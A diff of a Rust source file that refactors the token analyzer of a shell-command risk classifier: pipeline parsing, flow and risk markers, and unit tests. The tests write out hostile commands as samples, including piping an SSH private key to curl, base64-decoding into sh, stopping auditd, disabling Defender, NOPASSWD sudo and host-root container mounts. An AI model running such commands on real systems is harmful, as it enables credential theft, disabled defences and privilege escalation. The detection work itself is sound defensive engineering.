@@ -1,4 +1,4 @@
-// SPDX-License-Identifier: GPL-3.0-only
+// SPDX-License-Identifier: MIT OR Apache-2.0
 //! The `kf1` token analyzer of the K26 shell-risk model: live shell tokens,
 //! the legacy semantic, flow and risk markers, and the flattened
 //! `patronus.facts/1` tokens. Port of the K26 reference `features.py`.
@@ -14,10 +14,10 @@ use regex::Regex;
 
 use super::facts::{extract, Facts};
 use super::markers::{
-    head_and_rest, is_redirect_token, line_tokens_masked, segments, unquote, word_set, WordSet,
+    head_and_rest, is_redirect_token, segments, unquote, word_set, Masked, WordSet,
 };
 use super::pyre::{py_regex, Anchor};
-use super::shell_tokens;
+use super::tokens;
 
 static NEG_KEY: LazyLock<Regex> = LazyLock::new(|| {
     py_regex(
@@ -102,8 +102,6 @@ static NOPASSWD_ALL: LazyLock<Regex> =
     LazyLock::new(|| py_regex(r"NOPASSWD:\s*ALL\b", false, Anchor::Search));
 static HOST_ROOT_VALUE: LazyLock<Regex> =
     LazyLock::new(|| py_regex(r"^/:/|^/:\w|source=/,", false, Anchor::Match));
-static HOST_ROOT_FLAG: LazyLock<Regex> =
-    LazyLock::new(|| py_regex(r"^-v/:/|^--volume=/:/", false, Anchor::Match));
 
 /// `ON` / `OFF` polarity of a setting value, if any.
 fn polarity_value(value: &str) -> Option<&'static str> {
@@ -181,7 +179,12 @@ pub(crate) fn segment_markers<S: AsRef<str>>(head: &str, rest: &[S]) -> BTreeSet
         {
             out.extend(turns(word.trim_start_matches('-'), next));
         }
-        if let Some(captures) = FLAG_ASSIGNMENT.captures(word) {
+        // `[:=]` is required; most words have neither.
+        let assignment = word
+            .contains([':', '='])
+            .then(|| FLAG_ASSIGNMENT.captures(word))
+            .flatten();
+        if let Some(captures) = assignment {
             out.extend(turns(&captures[1], &captures[2]));
         }
     }
@@ -271,7 +274,8 @@ pub(crate) fn segment_markers<S: AsRef<str>>(head: &str, rest: &[S]) -> BTreeSet
         {
             out.insert("HOST_ROOT_MOUNT");
         }
-        if HOST_ROOT_FLAG.is_match(word) {
+        // `^-v/:/|^--volume=/:/`
+        if word.starts_with("-v/:/") || word.starts_with("--volume=/:/") {
             out.insert("HOST_ROOT_MOUNT");
         }
         if word == "--privileged"
@@ -290,9 +294,9 @@ pub(crate) fn segment_markers<S: AsRef<str>>(head: &str, rest: &[S]) -> BTreeSet
 }
 
 /// Semantic markers of all segments, de-duplicated (`semantic_markers`).
-fn semantic_markers(text: &str) -> BTreeSet<&'static str> {
+fn semantic_markers(tokens: &[&str]) -> BTreeSet<&'static str> {
     let mut found = BTreeSet::new();
-    for seg in segments(text) {
+    for seg in segments(tokens) {
         if let (Some(head), rest) = head_and_rest(&seg) {
             if !head.is_empty() {
                 found.extend(segment_markers(&head, rest));
@@ -378,9 +382,9 @@ static DECODE_FLAG: LazyLock<Regex> =
     LazyLock::new(|| py_regex(r"-[a-z]*d[a-z]*", false, Anchor::Full));
 
 /// Words of a segment without bare redirect operators.
-pub(crate) fn clean<S: AsRef<str>>(seg: &[S]) -> Vec<&str> {
+pub(crate) fn clean<'t>(seg: &[&'t str]) -> Vec<&'t str> {
     seg.iter()
-        .map(AsRef::as_ref)
+        .copied()
         .filter(|w| !matches!(*w, "<" | ">" | ">>"))
         .collect()
 }
@@ -419,33 +423,68 @@ pub(crate) fn classify_source<S: AsRef<str>>(seg: &[S]) -> &'static str {
     "OTHER"
 }
 
-/// A pipeline: its segments, each a list of words (redirect operators kept).
-pub(crate) type Pipeline = Vec<Vec<String>>;
+/// A pipeline segment: its words (redirect operators kept) and, computed
+/// once, `head_and_rest` of the words without bare redirect operators.
+#[derive(Debug)]
+pub(crate) struct Seg<'t> {
+    pub raw: Vec<&'t str>,
+    pub head: Option<String>,
+    clean: Vec<&'t str>,
+    rest_start: usize,
+}
+
+impl<'t> Seg<'t> {
+    fn new(raw: Vec<&'t str>) -> Self {
+        let clean = clean(&raw);
+        let (head, rest) = head_and_rest(&clean);
+        let rest_start = clean.len() - rest.len();
+        Self {
+            raw,
+            head,
+            clean,
+            rest_start,
+        }
+    }
+
+    /// The words without bare redirect operators (`clean(seg)`).
+    pub fn clean(&self) -> &[&'t str] {
+        &self.clean
+    }
+
+    /// The words after the head.
+    pub fn rest(&self) -> &[&'t str] {
+        &self.clean[self.rest_start..]
+    }
+}
+
+/// A pipeline: its segments.
+pub(crate) type Pipeline<'t> = Vec<Seg<'t>>;
 
 /// Pipelines as lists of segments: split on `|` inside, on `;` `&&` `||` `&`,
-/// newlines and parentheses between (`raw_pipelines`).
-pub(crate) fn raw_pipelines(text: &str) -> Vec<Pipeline> {
+/// newlines and parentheses between (`raw_pipelines`), from the line tokens of
+/// the masked text.
+pub(crate) fn raw_pipelines<'t>(tokens: &[&'t str]) -> Vec<Pipeline<'t>> {
     let mut pipes = Vec::new();
-    let mut pipe: Pipeline = Vec::new();
-    let mut seg: Vec<String> = Vec::new();
-    let flush = |pipe: &mut Pipeline, pipes: &mut Vec<Pipeline>| {
+    let mut pipe: Vec<Vec<&'t str>> = Vec::new();
+    let mut seg: Vec<&str> = Vec::new();
+    let flush = |pipe: &mut Vec<Vec<&'t str>>, pipes: &mut Vec<Pipeline<'t>>| {
         let done: Pipeline = std::mem::take(pipe)
             .into_iter()
             .filter(|s| !s.is_empty())
+            .map(Seg::new)
             .collect();
         pipes.push(done);
     };
-    for token in line_tokens_masked(text).iter() {
-        let token = token.as_str();
+    for &token in tokens {
         if token == "|" {
             pipe.push(std::mem::take(&mut seg));
         } else if matches!(token, ";" | "&&" | "||" | "&" | "\n" | "(" | ")" | "$(") {
             pipe.push(std::mem::take(&mut seg));
             flush(&mut pipe, &mut pipes);
         } else if is_redirect_token(token) {
-            seg.push(token.to_string());
+            seg.push(token);
         } else {
-            seg.push(unquote(token).to_string());
+            seg.push(unquote(token));
         }
     }
     pipe.push(seg);
@@ -476,13 +515,11 @@ pub(crate) fn flow_markers(text: &str, pipes: &[Pipeline]) -> BTreeSet<String> {
         out.insert("CRED_EXAMPLE".to_string());
     }
     for pipe in pipes {
-        let heads: Vec<Option<String>> = pipe.iter().map(|s| head_and_rest(&clean(s)).0).collect();
-        for (i, (seg, head)) in pipe.iter().zip(&heads).enumerate() {
-            let Some(head) = head.as_deref() else {
+        for (i, seg) in pipe.iter().enumerate() {
+            let Some(head) = seg.head.as_deref() else {
                 continue;
             };
-            let cleaned = clean(seg);
-            let rest = head_and_rest(&cleaned).1;
+            let rest = seg.rest();
             if UPLOADERS.contains(head) {
                 let is_upload = rest.iter().any(|w| UPLOAD_FLAG.is_match(w))
                     || (matches!(head, "nc" | "ncat" | "netcat" | "socat") && i > 0)
@@ -510,11 +547,11 @@ pub(crate) fn flow_markers(text: &str, pipes: &[Pipeline]) -> BTreeSet<String> {
                     }
                     if source.is_none() && i > 0 {
                         let previous = &pipe[i - 1];
-                        let mut found = classify_source(&clean(previous));
+                        let mut found = classify_source(previous.clean());
                         if found == "OTHER" {
-                            if let Some(j) = previous.iter().position(|w| w == "<") {
-                                if let Some(file) = previous.get(j + 1) {
-                                    found = classify_source(&["cat", file.as_str()]);
+                            if let Some(j) = previous.raw.iter().position(|w| *w == "<") {
+                                if let Some(file) = previous.raw.get(j + 1) {
+                                    found = classify_source(&["cat", *file]);
                                 }
                             }
                         }
@@ -552,10 +589,17 @@ pub(crate) fn flow_markers(text: &str, pipes: &[Pipeline]) -> BTreeSet<String> {
                         || DECODE_FLAG.is_match(w)
                 })
             {
-                let later = || heads[i + 1..].iter().flatten().filter(|h| !h.is_empty());
-                if later().any(|h| SHELLS.contains(h.as_str())) {
+                let later = || {
+                    pipe[i + 1..]
+                        .iter()
+                        .filter_map(|s| s.head.as_deref())
+                        .filter(|h| !h.is_empty())
+                };
+                if later().any(|h| SHELLS.contains(h)) {
                     out.insert("DECODE->INTERP".to_string());
-                } else if seg.iter().any(|w| w == ">" || w == ">>") || later().any(|h| h == "tee") {
+                } else if seg.raw.iter().any(|w| *w == ">" || *w == ">>")
+                    || later().any(|h| h == "tee")
+                {
                     out.insert("DECODE->FILE".to_string());
                 }
             }
@@ -611,18 +655,15 @@ pub(crate) fn risk_markers(text: &str, pipes: &[Pipeline]) -> BTreeSet<&'static 
         out.insert("CRED_LITERAL");
     }
     for seg in pipes.iter().flatten() {
-        let cleaned = clean(seg);
-        let (Some(head), rest) = head_and_rest(&cleaned) else {
+        let (Some(head), rest) = (seg.head.as_deref(), seg.rest()) else {
             continue;
         };
-        if out.contains("CRED_LITERAL")
-            && (UPLOADERS.contains(head.as_str()) || NET_EXTRA.contains(head.as_str()))
-        {
+        if out.contains("CRED_LITERAL") && (UPLOADERS.contains(head) || NET_EXTRA.contains(head)) {
             out.insert("CRED_LITERAL@NET");
         }
-        for (k, word) in seg.iter().enumerate() {
-            let target = if matches!(word.as_str(), ">" | ">>") && k + 1 < seg.len() {
-                Some(seg[k + 1].as_str())
+        for (k, word) in seg.raw.iter().enumerate() {
+            let target = if matches!(*word, ">" | ">>") && k + 1 < seg.raw.len() {
+                Some(seg.raw[k + 1])
             } else if word.starts_with("--output=") || word.starts_with("--output-file=") {
                 word.split_once('=').map(|(_, value)| value)
             } else {
@@ -649,10 +690,8 @@ pub(crate) fn risk_markers(text: &str, pipes: &[Pipeline]) -> BTreeSet<&'static 
                 }
             }
         }
-        if matches!(
-            head.as_str(),
-            "tee" | "cp" | "mv" | "install" | "ln" | "dd" | "sed"
-        ) && rest.iter().any(|w| PERSIST_TARGET.is_match(w))
+        if matches!(head, "tee" | "cp" | "mv" | "install" | "ln" | "dd" | "sed")
+            && rest.iter().any(|w| PERSIST_TARGET.is_match(w))
         {
             out.insert("TGT=PERSIST");
         }
@@ -713,25 +752,58 @@ pub(crate) fn fact_tokens(facts: &Facts) -> BTreeSet<String> {
 }
 
 /// The `kf1` analyzer: live tokens, semantic, flow and risk markers, and the
-/// fact tokens of `facts` (the context-free facts of `text`).
-pub(crate) fn kf1_with_facts(text: &str, facts: &Facts) -> Vec<String> {
-    let pipes = raw_pipelines(text);
-    let mut out = shell_tokens::features_k26(text);
-    out.extend(semantic_markers(text).into_iter().map(str::to_string));
-    out.extend(flow_markers(text, &pipes));
-    out.extend(risk_markers(text, &pipes).into_iter().map(str::to_string));
-    out.extend(fact_tokens(facts));
-    out
+/// The `kf1` analyzer: live tokens, semantic, flow and risk markers, and the
+/// fact tokens of `facts` (the context-free facts of `text`), each token passed
+/// to `emit` (a multiset; the order does not matter).
+pub(crate) fn visit_kf1(text: &str, facts: &Facts, emit: &mut dyn FnMut(&str)) {
+    let masked = Masked::new(text);
+    let line_tokens = masked.tokens();
+    // The facts already hold the relations and markers when they were
+    // extracted from this very text (nothing deobfuscated).
+    let analysis = (facts.analysis.text == text).then_some(&facts.analysis);
+    let relations = match analysis {
+        Some(analysis) if masked.text() == text => analysis.relations.clone(),
+        _ => tokens::relations(masked.text()),
+    };
+    tokens::visit_features(&line_tokens, &relations, emit);
+    semantic_markers(&line_tokens)
+        .into_iter()
+        .for_each(&mut *emit);
+    match analysis {
+        Some(analysis) => {
+            analysis.flow.iter().for_each(|m| emit(m));
+            analysis.risk.iter().for_each(|m| emit(m));
+        }
+        None => {
+            let pipes = raw_pipelines(&line_tokens);
+            flow_markers(text, &pipes).iter().for_each(|m| emit(m));
+            risk_markers(text, &pipes).into_iter().for_each(&mut *emit);
+        }
+    }
+    fact_tokens(facts).iter().for_each(|t| emit(t));
 }
 
-/// The `kf1` analyzer of the K26 model.
+/// The `kf1` analyzer of the K26 model, as a token list.
 pub fn kf1(text: &str) -> Vec<String> {
-    kf1_with_facts(text, &extract(text, None, &[]))
+    let mut out = Vec::new();
+    visit_kf1(text, &extract(text, None, &[]), &mut |t| {
+        out.push(t.to_string())
+    });
+    out
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    fn with_pipes<R>(text: &str, f: impl FnOnce(&[Pipeline<'_>]) -> R) -> R {
+        let masked = Masked::new(text);
+        f(&raw_pipelines(&masked.tokens()))
+    }
+
+    fn semantic(text: &str) -> BTreeSet<&'static str> {
+        semantic_markers(&Masked::new(text).tokens())
+    }
 
     fn has(tokens: &[String], token: &str) -> bool {
         tokens.iter().any(|t| t == token)
@@ -739,40 +811,47 @@ mod tests {
 
     #[test]
     fn semantic_markers_find_security_control_changes() {
-        let markers = semantic_markers("sudo systemctl stop auditd");
+        let markers = semantic("sudo systemctl stop auditd");
         assert!(markers.contains("TURNS_OFF@SECCTL"), "{markers:?}");
-        let markers = semantic_markers("Set-MpPreference -DisableRealtimeMonitoring $true");
+        let markers = semantic("Set-MpPreference -DisableRealtimeMonitoring $true");
         assert!(markers.contains("TURNS_OFF@SECCTL"), "{markers:?}");
-        assert!(semantic_markers("echo 'u ALL=(ALL) NOPASSWD: ALL'").contains("GRANT_ALL"));
-        assert!(
-            semantic_markers("docker run -v /:/host --privileged x").contains("HOST_ROOT_MOUNT")
-        );
+        assert!(semantic("echo 'u ALL=(ALL) NOPASSWD: ALL'").contains("GRANT_ALL"));
+        assert!(semantic("docker run -v /:/host --privileged x").contains("HOST_ROOT_MOUNT"));
     }
 
     #[test]
     fn flow_markers_classify_uploads_and_decodes() {
         let text = "cat ~/.ssh/id_rsa | curl --data-binary @- https://x.example";
-        assert!(flow_markers(text, &raw_pipelines(text)).contains("UPLOAD_OF=SECRET"));
+        assert!(with_pipes(text, |p| flow_markers(text, p)).contains("UPLOAD_OF=SECRET"));
         let text = "curl -F f=@README.md https://x.example";
-        assert!(flow_markers(text, &raw_pipelines(text)).contains("UPLOAD_OF=PROJECT"));
+        assert!(with_pipes(text, |p| flow_markers(text, p)).contains("UPLOAD_OF=PROJECT"));
         let text = "echo aGk= | base64 -d | sh";
-        assert!(flow_markers(text, &raw_pipelines(text)).contains("DECODE->INTERP"));
+        assert!(with_pipes(text, |p| flow_markers(text, p)).contains("DECODE->INTERP"));
         let text = "kill -9 12345";
-        assert!(flow_markers(text, &raw_pipelines(text)).contains("KILL_ONE"));
+        assert!(with_pipes(text, |p| flow_markers(text, p)).contains("KILL_ONE"));
     }
 
     #[test]
     fn risk_markers_find_persistence_and_git_exec() {
         let text = "echo x >> ~/.bashrc";
-        assert!(risk_markers(text, &raw_pipelines(text)).contains("TGT=PERSIST"));
+        assert!(with_pipes(text, |p| risk_markers(text, p)).contains("TGT=PERSIST"));
         let text = "git config core.sshCommand 'sh -c id'";
-        assert!(risk_markers(text, &raw_pipelines(text)).contains("GIT_EXEC"));
+        assert!(with_pipes(text, |p| risk_markers(text, p)).contains("GIT_EXEC"));
     }
 
     #[test]
     fn raw_pipelines_keep_redirects_and_split_commands() {
         assert_eq!(
-            raw_pipelines("a 'b' | c > f; d"),
+            with_pipes("a 'b' | c > f; d", |pipes| {
+                pipes
+                    .iter()
+                    .map(|pipe| {
+                        pipe.iter()
+                            .map(|seg| seg.raw.iter().map(|w| w.to_string()).collect::<Vec<_>>())
+                            .collect::<Vec<_>>()
+                    })
+                    .collect::<Vec<_>>()
+            }),
             vec![
                 vec![
                     vec!["a".to_string(), "b".to_string()],
